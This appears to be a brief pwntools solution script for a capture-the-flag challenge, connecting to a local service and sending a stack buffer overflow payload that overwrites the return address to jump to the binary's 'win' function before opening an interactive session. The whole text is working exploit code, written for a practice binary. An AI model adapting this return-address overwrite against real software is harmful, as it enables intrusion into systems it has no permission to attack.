from pwn import *

p = remote("localhost", 1337)

file = ELF("./chal")
p.sendlineafter(b"?", b"1024")
p.sendline(b"A" * 0x108 + p64(file.sym._fini) + p64(file.sym.win))
p.interactive()